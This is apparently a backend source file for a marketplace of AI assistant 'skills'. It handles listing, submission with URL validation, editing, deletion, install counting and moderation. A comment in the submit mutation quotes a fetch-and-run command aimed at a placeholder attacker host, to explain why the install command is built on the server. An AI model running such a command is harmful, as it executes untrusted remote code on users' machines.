import { v } from "convex/values";
import { query, mutation, internalMutation } from "./_generated/server";
import { getAuthUserId } from "@convex-dev/auth/server";
import type { Doc, Id } from "./_generated/dataModel";

// A skill is "publicly visible" when it's approved OR when it's a legacy
// row with no moderationStatus set (so the seed catalog stays visible).
function isPubliclyVisible(skill: Doc<"skills">): boolean {
  return (
    skill.moderationStatus === undefined ||
    skill.moderationStatus === "approved"
  );
}

// Strip fields that shouldn't leak out of public queries. `seededRating` and
// `seededRatingCount` are internal baselines used by the rating pipeline;
// exposing them in the API tells callers which ratings were pre-filled.
function publicSkillView(skill: Doc<"skills">) {
  const { seededRating: _s, seededRatingCount: _sc, ...rest } = skill;
  void _s;
  void _sc;
  return rest;
}

export const list = query({
  args: {
    category: v.optional(v.string()),
    query: v.optional(v.string()),
    sort: v.optional(v.string()),
  },
  handler: async (ctx, args) => {
    let skills = (await ctx.db.query("skills").collect()).filter(
      isPubliclyVisible,
    );

    if (args.category && args.category !== "all") {
      skills = skills.filter((s) => s.category === args.category);
    }

    if (args.query) {
      const q = args.query.toLowerCase();
      skills = skills.filter(
        (s) =>
          s.name.toLowerCase().includes(q) ||
          s.tagline.toLowerCase().includes(q) ||
          s.description.toLowerCase().includes(q) ||
          s.tags.some((t) => t.toLowerCase().includes(q)),
      );
    }

    switch (args.sort) {
      case "installs":
        skills.sort((a, b) => b.installs - a.installs);
        break;
      case "stars":
        skills.sort((a, b) => b.stars - a.stars);
        break;
      case "newest":
        skills.sort((a, b) => b._creationTime - a._creationTime);
        break;
      case "name":
        skills.sort((a, b) => a.name.localeCompare(b.name));
        break;
      case "featured":
      default:
        skills.sort((a, b) => {
          const af = a.featured ? 1 : 0;
          const bf = b.featured ? 1 : 0;
          if (af !== bf) return bf - af;
          return b.installs - a.installs;
        });
    }

    return skills.map(publicSkillView);
  },
});

export const featured = query({
  args: {},
  handler: async (ctx) => {
    const all = await ctx.db
      .query("skills")
      .withIndex("by_featured", (q) => q.eq("featured", true))
      .collect();
    return all
      .filter(isPubliclyVisible)
      .sort((a, b) => b.installs - a.installs)
      .map(publicSkillView);
  },
});

export const bySlug = query({
  args: { slug: v.string() },
  handler: async (ctx, args) => {
    const skill = await ctx.db
      .query("skills")
      .withIndex("by_slug", (q) => q.eq("slug", args.slug))
      .first();
    if (!skill) return null;

    // Hide non-approved skills from everyone except the submitter. We
    // keep the record visible to its own submitter so they can still see
    // the skill while it waits for review.
    if (!isPubliclyVisible(skill)) {
      const viewerId = await getAuthUserId(ctx);
      if (!viewerId || skill.submitterId !== viewerId) return null;
    }

    const related = (
      await ctx.db
        .query("skills")
        .withIndex("by_category", (q) => q.eq("category", skill.category))
        .collect()
    )
      .filter((s) => s._id !== skill._id && isPubliclyVisible(s))
      .slice(0, 3);

    return {
      skill: publicSkillView(skill),
      related: related.map(publicSkillView),
    };
  },
});

export const stats = query({
  args: {},
  handler: async (ctx) => {
    const skills = (await ctx.db.query("skills").collect()).filter(
      isPubliclyVisible,
    );
    if (skills.length === 0) {
      return { skills: 0, installs: 0, avgRating: 0 };
    }
    return {
      skills: skills.length,
      installs: skills.reduce((acc, s) => acc + s.installs, 0),
      avgRating: skills.reduce((acc, s) => acc + s.rating, 0) / skills.length,
    };
  },
});

export const categoryCounts = query({
  args: {},
  handler: async (ctx) => {
    const skills = (await ctx.db.query("skills").collect()).filter(
      isPubliclyVisible,
    );
    const counts: Record<string, number> = { all: skills.length };
    for (const s of skills) {
      counts[s.category] = (counts[s.category] ?? 0) + 1;
    }
    return counts;
  },
});

// GitHub repo owner/repo paths: letters, digits, underscore, dot, dash.
const GITHUB_URL_RE =
  /^https:\/\/github\.com\/([A-Za-z0-9_.-]+)\/([A-Za-z0-9_.-]+)$/;

export const submit = mutation({
  args: {
    name: v.string(),
    tagline: v.string(),
    description: v.string(),
    githubUrl: v.string(),
    // installCommand is server-constructed from the validated githubUrl.
    // Accepting it from the caller let anyone publish a listing whose
    // "install" step ran arbitrary shell (e.g. `curl evil.sh | sh`).
    category: v.string(),
    tags: v.array(v.string()),
    pricePoints: v.optional(v.number()),
  },
  handler: async (ctx, args) => {
    const userId = await getAuthUserId(ctx);
    if (!userId) {
      throw new Error("Sign in to submit a Skill.");
    }

    // Normalize + validate the GitHub URL. Strip trailing `.git` and `/`.
    const normalizedUrl = args.githubUrl
      .trim()
      .replace(/\.git$/, "")
      .replace(/\/$/, "");
    if (!GITHUB_URL_RE.test(normalizedUrl)) {
      throw new Error(
        "githubUrl must be a https://github.com/<owner>/<repo> URL.",
      );
    }

    // Length + presence checks on the text fields the UI also enforces,
    // so API callers can't bypass them.
    const name = args.name.trim();
    if (name.length < 1 || name.length > 60) {
      throw new Error("Name must be 1–60 characters.");
    }
    const tagline = args.tagline.trim();
    if (tagline.length < 1 || tagline.length > 120) {
      throw new Error("Tagline must be 1–120 characters.");
    }
    const description = args.description.trim();
    if (description.length < 1) {
      throw new Error("Description is required.");
    }

    const user = await ctx.db.get(userId);
    if (!user) {
      throw new Error("User record missing.");
    }

    const slug = slugify(name);
    if (slug.length < 2) {
      throw new Error("Name must produce a valid slug.");
    }
    const existing = await ctx.db
      .query("skills")
      .withIndex("by_slug", (q) => q.eq("slug", slug))
      .first();
    if (existing) {
      throw new Error("A Skill with that name already exists.");
    }

    const handle =
      (user as { name?: string; email?: string }).name ??
      (user as { email?: string }).email ??
      "anonymous";
    const avatar = pickAvatar(slug);

    // Build the install command server-side from the validated URL.
    const installCommand = `git clone ${normalizedUrl} ~/.claude/skills/${slug}`;

    const id = await ctx.db.insert("skills", {
      slug,
      name,
      tagline,
      description,
      category: args.category,
      tags: args.tags.slice(0, 5),
      githubUrl: normalizedUrl,
      installCommand,
      installs: 0,
      stars: 0,
      rating: 0,
      ratingCount: 0,
      featured: false,
      submitterId: userId,
      submitterHandle: handle,
      submitterAvatar: avatar,
      pricePoints: args.pricePoints && args.pricePoints > 0 ? args.pricePoints : undefined,
      moderationStatus: "pending",
    });

    return { id, slug };
  },
});

// recordInstall: credit at most one install per (user, skill). Anonymous
// clicks are not credited at all — a signed-in user is a weak but real
// cost to inflating a counter.
export const recordInstall = mutation({
  args: { slug: v.string() },
  handler: async (ctx, args) => {
    const skill = await ctx.db
      .query("skills")
      .withIndex("by_slug", (q) => q.eq("slug", args.slug))
      .first();
    if (!skill) throw new Error("Skill not found.");

    const userId = await getAuthUserId(ctx);
    if (!userId) {
      // Not signed in — don't inflate the counter. Return the current
      // number so the UI still has something to show.
      return { installs: skill.installs, counted: false };
    }

    // Already credited this user for this skill? Don't count again.
    const existing = await ctx.db
      .query("installEvents")
      .withIndex("by_user_and_skill", (q) =>
        q.eq("userId", userId).eq("skillId", skill._id),
      )
      .first();
    if (existing) {
      return { installs: skill.installs, counted: false };
    }

    await ctx.db.insert("installEvents", {
      skillId: skill._id,
      userId,
    });
    await ctx.db.patch(skill._id, { installs: skill.installs + 1 });

    return { installs: skill.installs + 1, counted: true };
  },
});

// Edit an existing Skill. Only the original submitter can edit.
export const updateSkill = mutation({
  args: {
    id: v.id("skills"),
    name: v.optional(v.string()),
    tagline: v.optional(v.string()),
    description: v.optional(v.string()),
    githubUrl: v.optional(v.string()),
    category: v.optional(v.string()),
    tags: v.optional(v.array(v.string())),
    pricePoints: v.optional(v.number()),
  },
  handler: async (ctx, args) => {
    const userId = await getAuthUserId(ctx);
    if (!userId) throw new Error("Sign in to edit a Skill.");

    const skill = await ctx.db.get(args.id);
    if (!skill) throw new Error("Skill not found.");
    if (skill.submitterId !== userId) {
      throw new Error("You can only edit Skills you published.");
    }

    const patch: Partial<Doc<"skills">> = {};

    if (args.name !== undefined) {
      const name = args.name.trim();
      if (name.length < 1 || name.length > 60) {
        throw new Error("Name must be 1–60 characters.");
      }
      patch.name = name;
      // Slug stays fixed to avoid breaking URLs and references. If the
      // submitter wants a new slug, they can delete and republish.
    }

    if (args.tagline !== undefined) {
      const tagline = args.tagline.trim();
      if (tagline.length < 1 || tagline.length > 120) {
        throw new Error("Tagline must be 1–120 characters.");
      }
      patch.tagline = tagline;
    }

    if (args.description !== undefined) {
      const description = args.description.trim();
      if (description.length < 1) throw new Error("Description is required.");
      patch.description = description;
    }

    if (args.githubUrl !== undefined) {
      const normalizedUrl = args.githubUrl
        .trim()
        .replace(/\.git$/, "")
        .replace(/\/$/, "");
      if (!GITHUB_URL_RE.test(normalizedUrl)) {
        throw new Error(
          "githubUrl must be a https://github.com/<owner>/<repo> URL.",
        );
      }
      patch.githubUrl = normalizedUrl;
      // Rebuild installCommand from the new URL so the two never drift.
      patch.installCommand = `git clone ${normalizedUrl} ~/.claude/skills/${skill.slug}`;
    }

    if (args.category !== undefined) patch.category = args.category;
    if (args.tags !== undefined) patch.tags = args.tags.slice(0, 5);
    if (args.pricePoints !== undefined) {
      patch.pricePoints =
        args.pricePoints > 0 ? args.pricePoints : undefined;
    }

    if (Object.keys(patch).length === 0) return { updated: false };

    await ctx.db.patch(args.id, patch);
    return { updated: true };
  },
});

// Delete a Skill plus everything that points at it. Only the original
// submitter can delete. Cascade so users don't end up with orphaned
// favourites/votes/ratings/comments pointing at nothing.
export const deleteSkill = mutation({
  args: { id: v.id("skills") },
  handler: async (ctx, args) => {
    const userId = await getAuthUserId(ctx);
    if (!userId) throw new Error("Sign in to delete a Skill.");

    const skill = await ctx.db.get(args.id);
    if (!skill) throw new Error("Skill not found.");
    if (skill.submitterId !== userId) {
      throw new Error("You can only delete Skills you published.");
    }

    // Cascade through every side table that stores skillId. Each uses a
    // by_skill index so the lookup is cheap. Convex has no multi-row
    // delete, so we iterate.
    const installs = await ctx.db
      .query("installEvents")
      .withIndex("by_skill", (q) => q.eq("skillId", args.id))
      .collect();
    for (const r of installs) await ctx.db.delete(r._id);

    const favs = await ctx.db
      .query("favorites")
      .withIndex("by_skill", (q) => q.eq("skillId", args.id))
      .collect();
    for (const r of favs) await ctx.db.delete(r._id);

    const votes = await ctx.db
      .query("votes")
      .withIndex("by_skill", (q) => q.eq("skillId", args.id))
      .collect();
    for (const r of votes) await ctx.db.delete(r._id);

    const ratings = await ctx.db
      .query("ratings")
      .withIndex("by_skill", (q) => q.eq("skillId", args.id))
      .collect();
    for (const r of ratings) await ctx.db.delete(r._id);

    const comments = await ctx.db
      .query("comments")
      .withIndex("by_skill", (q) => q.eq("skillId", args.id))
      .collect();
    for (const r of comments) await ctx.db.delete(r._id);

    const labels = await ctx.db
      .query("skillLabels")
      .withIndex("by_skill", (q) => q.eq("skillId", args.id))
      .collect();
    for (const r of labels) await ctx.db.delete(r._id);

    const purchases = await ctx.db
      .query("purchases")
      .withIndex("by_skill", (q) => q.eq("skillId", args.id))
      .collect();
    for (const r of purchases) await ctx.db.delete(r._id);

    await ctx.db.delete(args.id);
    return { deleted: true };
  },
});

// Admin-only moderation. Internal — callable from `npx convex run` or
// from a future /admin/moderation UI. Approving a pending skill makes
// it visible and lets it count toward the submitter's reputation.
export const moderateSkill = internalMutation({
  args: {
    id: v.id("skills"),
    action: v.union(v.literal("approve"), v.literal("reject")),
  },
  handler: async (ctx, args) => {
    const skill = await ctx.db.get(args.id);
    if (!skill) throw new Error("Skill not found.");
    await ctx.db.patch(args.id, {
      moderationStatus: args.action === "approve" ? "approved" : "rejected",
    });
    return { id: args.id, status: args.action };
  },
});

function slugify(name: string): string {
  return name
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 60);
}

function pickAvatar(seed: string): string {
  const avatars = ["🤖", "🧠", "⚡", "🌐", "🔬", "🪐", "🛠️", "📡", "🦾", "✨"];
  let h = 0;
  for (const c of seed) h = (h * 31 + c.charCodeAt(0)) & 0xfffffff;
  return avatars[h % avatars.length];
}
